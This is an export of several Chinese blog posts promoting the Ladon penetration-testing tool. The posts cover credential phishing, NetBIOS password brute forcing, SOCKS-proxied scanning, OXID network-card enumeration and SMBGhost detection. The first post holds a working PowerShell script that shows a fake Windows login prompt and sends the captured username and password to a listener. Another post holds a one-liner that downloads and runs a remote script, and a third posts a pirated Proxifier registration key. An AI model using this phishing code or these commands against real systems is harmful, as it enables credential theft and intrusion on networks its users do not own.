<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>&gt;= Ladon 6.6.3<br>Update: 20200618</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>使用PowerShell模仿Windowns登陆认证获取管理员密码，Ladon监听捕获基础认证密码。</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>域控或管理员密码获取，当前权限很低又无法提权时。（有权限直接读明文或HASH）</p>
<h3 id="Ladon监听"><a href="#Ladon监听" class="headerlink" title="Ladon监听"></a>Ladon监听</h3><p>该功能模仿了MSF里的基础认证监听模块，但最大的优势在于无需占用系统大量空间和内存。<br>可直接部署在目标内网或VPS上，也无需复杂命令，直接输以下命令一键监听自动捕获密码。<br>其它用途：<a href="http://k8gege.org/Ladon/webser.html">http://k8gege.org/Ladon/webser.html</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon Web 800</span><br></pre></td></tr></table></figure>

<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/AuthPass.PNG"></p>
<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>执行以下脚本代码，会弹出十分逼真的基础认证登陆窗口，自动获取用户名和域来提高真实性。<br>当然也可以使用其它脚本或语言，如JS水坑攻击、XSS截取各种WEB邮箱密码等等多种钩鱼姿势。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cred</span> = <span class="variable">$host</span>.ui.promptforcredential(<span class="string">'Failed Authentication'</span>,<span class="string">''</span>,[<span class="type">Environment</span>]::UserDomainName + <span class="string">"\"</span> + [<span class="type">Environment</span>]::UserName,[<span class="type">Environment</span>]::UserDomainName);</span><br><span class="line">[<span class="type">System.Net.ServicePointManager</span>]::ServerCertificateValidationCallback = &#123;<span class="variable">$true</span>&#125;;</span><br><span class="line"><span class="built_in">Add-Type</span> <span class="string">@'</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">public class Authorization</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">public static void submit(string usr,string pwd)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">string url = "http://192.168.1.110:8000/";</span></span><br><span class="line"><span class="string">System.Net.HttpWebRequest myReq = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);</span></span><br><span class="line"><span class="string">string username = usr;</span></span><br><span class="line"><span class="string">string password = pwd;</span></span><br><span class="line"><span class="string">string usernamePassword = username + ":" + password;</span></span><br><span class="line"><span class="string">System.Net.CredentialCache mycache = new System.Net.CredentialCache();</span></span><br><span class="line"><span class="string">mycache.Add(new Uri(url), "Basic", new System.Net.NetworkCredential(username, password));</span></span><br><span class="line"><span class="string">myReq.Credentials = mycache;</span></span><br><span class="line"><span class="string">myReq.Headers.Add("Authorization", "Basic " + Convert.ToBase64String(new System.Text.ASCIIEncoding().GetBytes(usernamePassword)));</span></span><br><span class="line"><span class="string">System.Net.WebResponse wr = myReq.GetResponse();</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">'@</span></span><br><span class="line">[<span class="type">Authorization</span>]::submit(<span class="variable">$cred</span>.username, <span class="variable">$cred</span>.getnetworkcredential().password)</span><br></pre></td></tr></table></figure>


<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
<div style="text-align: center; width: 710px; border: green solid 0px;">
<img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
</div>
]]></content>
      <categories>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Pass</tag>
      </tags>
  </entry>
  <entry>
    <title>给你一个免费加入&quot;K8小密圈&quot;的机会</title>
    <url>/p/free.html</url>
    <content><![CDATA[<h3 id="K8小密圈"><a href="#K8小密圈" class="headerlink" title="K8小密圈"></a>K8小密圈</h3><p>于2020年8月1日建立，所有QQ群因气氛不活跃停止维护，加上有人白嫖还恶意举报（我的博客链接只在自己Q群有发布过，却被QQ提示危险不要访问，说明有人白嫖还举报），另外一个原因免费无任何门槛，有人进来乱发无关技术的广告，无论是Q群还是免费星球都是如此，因此创建了收费星球，收费不是目的，目的是防止无关人员进入，其次购买资源或奖励等，对于不愿分享技术的就分享钱吧，有些工具以后只会在该星球发布。当然并不是说你不加入就用不到，你的朋友会私下发给你，或者说等过一段时间才会公开，你才能下载得到。</p>
<p>微信扫码或点击链接加入知识星球：<a href="https://t.zsxq.com/zZNfune" target="_blank" rel="noopener">https://t.zsxq.com/zZNfune</a></p>
<div style="text-align: center; width: 710px; border: green solid 0px;">
<img alt style="display: inline-block;width: 500px;height: 600px;" data-original="http://k8gege.org/img/k8team.jpg">
</div>


<h3 id="免费名额"><a href="#免费名额" class="headerlink" title="免费名额"></a>免费名额</h3><p>名额仅剩30人</p>
<p>PS：由于免费名额有限，所以不再接受朋友的朋友直接进入，对大家一视同仁，写个文章很简单吧</p>
<h3 id="免费条件"><a href="#免费条件" class="headerlink" title="免费条件"></a>免费条件</h3><p>1.发文章或视频，在博客或第3方平台等发布Ladon相关文章，如使用教程、漏洞复现、实战、靶场等<br>2.用心写的文章或教程将会收录到本博客，并给予1个免费加入链接(文章链接可微博、QQ、星球给我)<br>3.有效期至名额完成为此（名单会在本页公布，方便大家看剩余名额）</p>
<p>注意：如果是实战项目，图片最好打码，除非客户授权你发布文章，以免客户说你公开它的网络漏洞</p>
<h3 id="参考例子"><a href="#参考例子" class="headerlink" title="参考例子"></a>参考例子</h3><p>下面是一个视频教程，这个UP主讲得顶好的，但只是简单的介绍用法，没有靶场、没有实战，未体现出工具的功能以及实战用途，对于刚入门的小白来说，还是不太了解工具有多大作用，特别是实战如何使用。</p>
<p>1.【学习分享】ladon工具基本使用  <a href="https://www.bilibili.com/video/av243704386" target="_blank" rel="noopener">https://www.bilibili.com/video/av243704386</a></p>
<h3 id="活动背景"><a href="#活动背景" class="headerlink" title="活动背景"></a>活动背景</h3><p>由于我没太多时间写文档，或者有些人看不懂现有文档。集思广义让大家参与Ladon文档，毕竟每个人的水平以及理解能力不一样，写的文档受众也会不一样。我认为文档是写得已经很明白了，但很多时候依然会有人来问我哪个功能如何使用，在怎样的场景下使用，有人问这样的问题，我觉得是失败的，因为我的初衷是让任何人都轻易上手。加上星球刚建不久，有人想免费加入，也有一定的免费名额。</p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
      </tags>
  </entry>
  <entry>
    <title>〖教程〗NbtScan 139端口弱口令/Netbios密码爆破</title>
    <url>/p/NbtScan.html</url>
    <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/NbtScan.html";
</script>


<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>Ladon &gt;= 7.1</p>
<h3 id="139端口"><a href="#139端口" class="headerlink" title="139端口"></a>139端口</h3><p>NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于Windows”文件和打印机共享”和SAMBA。</p>
<h3 id="IPC-通信"><a href="#IPC-通信" class="headerlink" title="IPC$通信"></a>IPC$通信</h3><p>Windows系统中的net use ipc$整个通信过程，先445-&gt;137-&gt;139验证，当你开启防火墙禁用445，发现系统命令就无法连接IPC了，根本没机会走到139，所以使用系统自带命令连接的ipc$需要同时开启这些端口。说入侵139就是IPC$的说法是错误的，就像说wmiexec.vbs可完全替代PSEXEC工具一样，这个脚本需要目标开启135和445，因为它通过445来传输结果，意味着目标只开放135这个VBS的回显就没有了，其实假设目标只开放445，这个VBS脚本还能执行命令吗？哪来的替代或扔掉？这个系统的IPC$连接也是同理，测试首先得把其它端口禁了再说话。虽然系统自带命令需要同时开启，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的，详情参考impacket。</p>
<h3 id="Nbt爆破"><a href="#Nbt爆破" class="headerlink" title="Nbt爆破"></a>Nbt爆破</h3><p>系统自带命令需要同时开启139和445，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的。系统的IPC$就像读取系统密码一样，可以先植入CS再用MIMI插件读取，但是我们也可以不使用CS，直接MIMI读取密码啊。基于和MIMI可以独立读取密码的原理，反向思路我们也可以完全不走445，直接通过139验证WINDOWS密码，所以这个和IPC$不一样(指的是系统命令连接的ipc)，所以为了防止大家误解，起名为NbtScan。毕竟走的也是Netbios，系统IPC$验证一是时间非常久，且必须开启445，如果445都开了为何不用SmbScan验证密码呢？但是由于近几年勒索病毒横行，可能很多机器默认会关闭445，所以会导致无法通过445验证密码，但是没关系还有139啊。</p>
<h3 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h3><h4 id="139端口-Netbios密码爆破-Windows"><a href="#139端口-Netbios密码爆破-Windows" class="headerlink" title="139端口 Netbios密码爆破(Windows)"></a>139端口 Netbios密码爆破(Windows)</h4><p>Ladon 192.168.1.8/24 NbtScan<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/NbtScan.PNG"></p>
<h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载NbtScan-139端口弱口令爆破"><a href="#远程加载NbtScan-139端口弱口令爆破" class="headerlink" title="远程加载NbtScan 139端口弱口令爆破"></a>远程加载NbtScan 139端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon7.1_all.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon7.1_all.ps1&#39;</a>); Ladon 192.168.1.141 NbtScan”</p>
<h3 id="139传输文件"><a href="#139传输文件" class="headerlink" title="139传输文件"></a>139传输文件</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> smb.SMBConnection <span class="keyword">import</span> SMBConnection</span><br><span class="line"><span class="keyword">from</span> nmb.NetBIOS <span class="keyword">import</span> NetBIOS</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBIOSName</span><span class="params">(remote_smb_ip, timeout=<span class="number">30</span>)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bios = NetBIOS()</span><br><span class="line">        srv_name = bios.queryIPForName(remote_smb_ip, timeout=timeout)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">"Looking up timeout, check remote_smb_ip again!!"</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        bios.close()</span><br><span class="line">        <span class="keyword">return</span> srv_name</span><br><span class="line">serverip=<span class="string">'192.168.1.40'</span></span><br><span class="line">conn = SMBConnection(<span class="string">'k8gege'</span>, <span class="string">'k8gege520'</span>, <span class="string">'C$'</span>,getBIOSName(serverip)[<span class="number">0</span>], use_ntlm_v2 = <span class="literal">True</span>) </span><br><span class="line"><span class="keyword">assert</span> conn.connect(serverip, <span class="number">139</span>)</span><br><span class="line"><span class="comment">#temdir='/'</span></span><br><span class="line"><span class="comment">#dir=os.path.join('/','public')</span></span><br><span class="line">f = open(<span class="string">'C:/123.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">conn.storeFile(<span class="string">'Users'</span>,<span class="string">'234.txt'</span>,f)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>


<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>netbios</tag>
      </tags>
  </entry>
  <entry>
    <title>〖教程〗Ladon Socks代理扫描(附Proxifier4.0注册码)</title>
    <url>/p/proxy.html</url>
    <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/proxy.html";
</script>

<h3 id="Socks代理工具"><a href="#Socks代理工具" class="headerlink" title="Socks代理工具"></a>Socks代理工具</h3><h4 id="windows平台"><a href="#windows平台" class="headerlink" title="windows平台"></a>windows平台</h4><p>Proxifier软件是一款极其强大的socks5客户端,同时也是一款强大的站长工具。Proxifier支持TCP，UDP协议，支持Xp，Vista，Win7，支持socks4，socks5，http代理协议可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p>
<p>2020年7月proxifier官方发布最新版4.0.1修复ipv6兼容问题，以及其它很多问题。 3.42支持类似chrome这样工作的69个应用程序，修复了一些第三方应用程序的兼容性。</p>
<p>以上更新日志，充分说明该代理工具不能保证兼容所有第3方程序，或者说兼容性不好，同样的3.31版本有人能代理Ladon，有人代理不了。 </p>
<p>官方下载: <a href="http://www.proxifier.com/download" target="_blank" rel="noopener">http://www.proxifier.com/download</a></p>
<h4 id="linux-mac平台"><a href="#linux-mac平台" class="headerlink" title="linux/mac平台"></a>linux/mac平台</h4><p>ProxyChains遵循GNU协议的一款适用于linux系统的网络代理设置工具。强制由任一程序发起的TCP连接请求必须通过诸如TOR 或 SOCKS4, SOCKS5 或HTTP(S) 代理。支持的认证方式包括：SOCKS4/5的用户/密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧道，并且可配置多个代理。</p>
<p>ProxyChains代理工具非常好，真的可以兼容所有程序，不像proxifier好多程序还不定兼容，当然两者都有一定的丢包率，Ladon批量扫描功能过快超时短，可能会导致有些结果丢失，回头设置一个代理模式，提高超时放慢速度看看。</p>
<h3 id="代理支持协议"><a href="#代理支持协议" class="headerlink" title="代理支持协议"></a>代理支持协议</h3><p>通过以上两平台的代理工具简介，可以看出代理客户端并不支持ICMP协议。<br>所以使用它们代理，无法PING通内网主机。何况FRP、EW等也不支持ICMP。</p>
<h4 id="支持协议"><a href="#支持协议" class="headerlink" title="支持协议"></a>支持协议</h4><p>1.TCP<br>2.UDP</p>
<h4 id="代理协议"><a href="#代理协议" class="headerlink" title="代理协议"></a>代理协议</h4><p>1.SOCKS4<br>2.SOCKS5<br>3.HTTP(S)</p>
<h3 id="代理工具兼容性"><a href="#代理工具兼容性" class="headerlink" title="代理工具兼容性"></a>代理工具兼容性</h3><p>推荐proxifier 3.42及以上版本，最好是最新版，3.31及以前的兼容性极差，所以不推荐，我使用VM虚拟机12版本的时候，可以代理Ladon,但后面升级为15，发现很难代理，就连测试系统自带的telnet程序，都不行了。Ladon在多个虚拟机测试也是一样，但是有同事也是用3.31却可以代理使用，网上很多人也和我反应不能用。后来我看了下3.31是2016年的，就想看看官方有没更新，发现18年有个3.42版本，测试一下，兼容好多了，然后在星球发表，发表不久发现官方更新了4.0.1，只是他没写更新日志，还以为没有更新。</p>
<h3 id="Proxifier通用注册码"><a href="#Proxifier通用注册码" class="headerlink" title="Proxifier通用注册码"></a>Proxifier通用注册码</h3><p>4.0.1 (2020.7.7)<br>3.4.2 (2018.8.31)<br>3.3.1 (2016不推荐)<br>5EZ8G-C3WL5-B56YG-SCXM9-6QZAP（Standard Edition）</p>
<h3 id="Ladon工作原理"><a href="#Ladon工作原理" class="headerlink" title="Ladon工作原理"></a>Ladon工作原理</h3><p>由于proxifier客户端不支持ICMP或者说ew等代理工具也不支持ICMP协议，所以代理后探测存活主机就不要使用Ping或OnlinePC模块了，使用扫描模块需加noping参数，非扫描模块不需要noping。探测存活主机可使用osscan、webscan、urlscan、ms17010、smbghost等模块，他们能扫出东西不也意味着主机存活吗？ping不是唯一的探测存活主机存活方式，系统防火墙默认禁ping，使用ping探测本身就会错过很多存活主机，所以实战要结合多种方式探测。假设目标防火墙只允许smb协议通过，你用nmap端口扫描的TCP包被拦截显示成关的，但用ms17010，smbghost扫出漏洞或者用smbscan就显示密码错误拒绝访问等，这不就说明445确实开放吗？不要死板的老是停留在ping和单纯的端口扫描来探测存活主机，要考虑实际环境，OnlinePC可探测到大部分存活主机，但不等于能探测到全部存活主机，当你无法渗透已扫到的存活主机，就得尝试其它模块探测更多主机。</p>
<p>PS：如何验证代理是否支持ICMP协议，非常简单用系统自带命令PING目标内网IP（不要PING自己的内网哦），能PING通目标存活IP，说明代理支持ICMP协议，意味你可以像挂了目标VPN一样或者像本地一样随意扫描目标内网，如果根本PING不通，老老实实扫描时加上noping参数。</p>
<h3 id="Socks代理扫描"><a href="#Socks代理扫描" class="headerlink" title="Socks代理扫描"></a>Socks代理扫描</h3><p>例子：Socks5代理扫描目标10.1.2段是否存在MS17010漏洞<br>Ladon noping 10.1.2.8/24 MS17010</p>
<p>PS：再次强调，由于代理工具不支持ICMP，所以Ladon扫描类功能必须加noping参数，非扫描模块不需要。</p>
<h3 id="实战扫描结果"><a href="#实战扫描结果" class="headerlink" title="实战扫描结果"></a>实战扫描结果</h3><p>Linux SSH服务识别之22端口扫描<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/proxy_porscan22.png"></p>
<p>WEB HttpBanner扫描<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/proxy_httpscan.png"></p>
<p>永恒之默漏洞 SMBghost CVE-2020-0796<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/proxy_smbghost.png"></p>
<p>OSSCAN探测目标操作系统<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/proxy_osscan.png"></p>
<p>ProtScan端口扫描<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/proxy_porscan.png"></p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
      </categories>
      <tags>
        <tag>Proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon枚举远程主机网卡信息(OXID定位多网卡主机)</title>
    <url>/p/ethscan.html</url>
    <content><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>
<script language="javascript" type="text/javascript">
window.location.href="http://k8gege.org/Ladon/ethscan.html";
</script>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>OXID Resolver是在支持COM +的每台计算机上运行的服务。它执行两项重要职责：<br>存储与远程对象连接所需的RPC字符串绑定，并将其提供给本地客户端。<br>将ping消息发送到本地计算机具有客户端的远程对象，并接收在本地计算机上运行的对象的ping消息。</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Other/DCOM_OXID.PNG"></p>
<p>我们只需要向远程主机发以下两个包，再解析返回结果即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">        static byte[] s1 =&#123;</span><br><span class="line">0x05,0x00,0x0b,0x03,0x10,0x00,0x00,0x00,</span><br><span class="line">0x48,0x00,0x00,0x00,0x01,0x00,0x00,0x00,</span><br><span class="line">0xb8,0x10,0xb8,0x10,0x00,0x00,0x00,0x00,</span><br><span class="line">0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,</span><br><span class="line">0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,</span><br><span class="line">0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a,</span><br><span class="line">0x00,0x00,0x00,0x00,0x04,0x5d,0x88,0x8a,</span><br><span class="line">0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,</span><br><span class="line">0x2b,0x10,0x48,0x60,0x02,0x00,0x00,0x00</span><br><span class="line">     </span><br><span class="line">                          &#125;;</span><br><span class="line"></span><br><span class="line">        static byte[] s2 =&#123;</span><br><span class="line"></span><br><span class="line">0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,</span><br><span class="line">0x18,0x00,0x00,0x00,0x01,0x00,0x00,0x00,</span><br><span class="line">0x00,0x00,0x00,0x00,0x00,0x00,0x05,0x00</span><br><span class="line">     </span><br><span class="line">                          &#125;;</span><br></pre></td></tr></table></figure>

<h3 id="程序版本"><a href="#程序版本" class="headerlink" title="程序版本"></a>程序版本</h3><p>Ladon &gt;=7.0</p>
<h3 id="模块名称"><a href="#模块名称" class="headerlink" title="模块名称"></a>模块名称</h3><p>EthScan<br>OxidScan</p>
<h3 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h3><p>通过Windows的一些DCOM接口进行网卡进行信息枚举，定位多网卡主机，在无权限的情况下得知远程主机是否含有内网甚至VPN;当然也可以判定Windows主机,K8抓包发现xp和03系统有一段相同特征，WIN7-WIN10等也是相同特征，所以可区分是否WIN7以上系统。</p>
<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>1.Windows主机<br>2.开放135端口<br>3.DCOM&gt;=5.6（老外原文说5.6版本才可用，可能他写错了）<br>4.dcomcnfg配置中的“面向连接的TCP/IP”协议没有被移除</p>
<p>PS: 由于有一定条件限制，若该模块无法定位多网卡主机，也可使用OnlinePC、OsScan、WebScan、WhatCMS等模块探测，如多个IP同一个机器名，网样的网站标题，或同样的网卡MAC地址，也可定位多网卡主机，只是没有通过该方法好，毕竟一个是100%，一个是90%，比如负载均横同样的网站却不在同一台机器上。</p>
<h3 id="测试系统"><a href="#测试系统" class="headerlink" title="测试系统"></a>测试系统</h3><p>测试XP/Win7/Win8/Win10,2003/2008/2012均成功，2016和2019无环境未测，应该支持。</p>
<h3 id="EthScan模块用法"><a href="#EthScan模块用法" class="headerlink" title="EthScan模块用法"></a>EthScan模块用法</h3><h4 id="扫描指定主机"><a href="#扫描指定主机" class="headerlink" title="扫描指定主机"></a>扫描指定主机</h4><p>Ladon 192.168.1.8 EthScan</p>
<h4 id="扫描C段主机"><a href="#扫描C段主机" class="headerlink" title="扫描C段主机"></a>扫描C段主机</h4><p>Ladon 192.168.1.8/24 EthScan<br>Ladon 192.168.1.8/C EthScan</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/EthScan.PNG"></p>
<h4 id="批量扫描IP列表主机"><a href="#批量扫描IP列表主机" class="headerlink" title="批量扫描IP列表主机"></a>批量扫描IP列表主机</h4><p>ip.txt里放需要扫描的IP，使用以下命令即可<br>Ladon EthScan</p>
<h4 id="批量检测IP段（-24）"><a href="#批量检测IP段（-24）" class="headerlink" title="批量检测IP段（/24）"></a>批量检测IP段（/24）</h4><p>ip24.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon EthScan</p>
<h4 id="批量检测IP段（-16）"><a href="#批量检测IP段（-16）" class="headerlink" title="批量检测IP段（/16）"></a>批量检测IP段（/16）</h4><p>ip16.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon EthScan</p>
<h3 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h3><h4 id="防止通过135网卡探测"><a href="#防止通过135网卡探测" class="headerlink" title="防止通过135网卡探测"></a>防止通过135网卡探测</h4><p>运行dcomcnfg，打开“组件服务”→“计算机”，在“我的电脑”上右键点击，选“属性”；然后点默认属性，把“在此计算机上启用分布式COM（E）”的勾去掉，接着返回到“默认协议”，移除“面向连接的TCP/IP”协议。重启后发现135端口还是开放，但已无法探测机器名和网卡，不过WmiScan还可以扫描到密码。</p>
<p><img alt="image" data-original="http://k8gege.org/k8img/Other/wmi_rpc_no.PNG"></p>
<h4 id="彻底关闭135端口"><a href="#彻底关闭135端口" class="headerlink" title="彻底关闭135端口"></a>彻底关闭135端口</h4><p>运行regedit，进入注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc<br>右键点击Rpc,新建——项——输入 Internet<br>然后重启，再cmd,输入netstat -an,就发现135端口彻底消失，此时无法枚举网卡信息，也无法WMI扫描密码，无法WMI远程执行等。</p>
<p>PS：由于很多服务是互相依赖的关系，不推荐关闭以免影响系统服务，比如计划任务程序无法正常运行，磁盘碎片整理又依赖计划任务而打不开等。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/" target="_blank" rel="noopener">https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a></p>
<p><a href="https://payloads.online/archivers/2020-07-16/1?nsukey=oZl56gbIGgfxQcx%2F0HMnIkDOK1FvyCWabho4pheMAZ8WRjelIN1lFyf%2FmHcseWWhqnr%2FmmH2auwGTJDaANogm5UzmXCLggfgR%2FMkudQEJNkqWUsU6CSgCb%2FzUbrWP8kHd5jW5Ef%2FS7JxhKfzSFOdU7xdbahjeLVqv8CRKy3Wbv1gjhZZNsh6HJYxmWJ0AjK6mrrPaBaTRWg1zswyqwb1ng%3D%3D" target="_blank" rel="noopener">https://payloads.online/archivers/2020-07-16/1?nsukey=oZl56gbIGgfxQcx%2F0HMnIkDOK1FvyCWabho4pheMAZ8WRjelIN1lFyf%2FmHcseWWhqnr%2FmmH2auwGTJDaANogm5UzmXCLggfgR%2FMkudQEJNkqWUsU6CSgCb%2FzUbrWP8kHd5jW5Ef%2FS7JxhKfzSFOdU7xdbahjeLVqv8CRKy3Wbv1gjhZZNsh6HJYxmWJ0AjK6mrrPaBaTRWg1zswyqwb1ng%3D%3D</a></p>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
]]></content>
      <categories>
        <category>Ladon</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>OXID</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon检测永恒之黑漏洞 SMBGhost CVE-2020-0796</title>
    <url>/p/smbghost_cve_2020_0796.html</url>
    <content><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>CVE-2020-0796漏洞影响运行Windows 10版本1903，Windows Server版本1903（服务器核心安装），Windows 10版本1909和Windows Server版本1909（服务器核心安装）的设备。根据Fortinet，其他Microsoft版本应受到影响。</p>
<h3 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h3><p>漏洞编号：CVE-2020-0796<br>漏洞别名：SMBGhost、永恒之黑<br>影响版本：Win10或2016 1903 | 1909<br>返回结果：IP、机器名、漏洞编号、操作系统版本</p>
<h3 id="无损扫描"><a href="#无损扫描" class="headerlink" title="无损扫描"></a>无损扫描</h3><p>通过检测SMB3.1.1是否启用压缩功能判定漏洞，和MS17010一样不会对目标造成任何损害，也不会被杀软拦截。</p>
<h3 id="SMBGhost漏洞检测"><a href="#SMBGhost漏洞检测" class="headerlink" title="SMBGhost漏洞检测"></a>SMBGhost漏洞检测</h3><h4 id="扫描指定主机SMBGhost漏洞"><a href="#扫描指定主机SMBGhost漏洞" class="headerlink" title="扫描指定主机SMBGhost漏洞"></a>扫描指定主机SMBGhost漏洞</h4><p>Ladon 192.168.1.8 SMBGhost</p>
<h4 id="扫描C段主机SMBGhost漏洞"><a href="#扫描C段主机SMBGhost漏洞" class="headerlink" title="扫描C段主机SMBGhost漏洞"></a>扫描C段主机SMBGhost漏洞</h4><p>Ladon 192.168.1.8/24 SMBGhost<br>Ladon 192.168.1.8/C SMBGhost</p>
<h4 id="批量扫描IP列表主机SMBGhost漏洞"><a href="#批量扫描IP列表主机SMBGhost漏洞" class="headerlink" title="批量扫描IP列表主机SMBGhost漏洞"></a>批量扫描IP列表主机SMBGhost漏洞</h4><p>ip.txt里放需要扫描的IP，使用以下命令即可<br>Ladon SMBGhost</p>
<h4 id="批量检测IP段（-24）SMBGhost漏洞"><a href="#批量检测IP段（-24）SMBGhost漏洞" class="headerlink" title="批量检测IP段（/24）SMBGhost漏洞"></a>批量检测IP段（/24）SMBGhost漏洞</h4><p>ip24.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon SMBGhost</p>
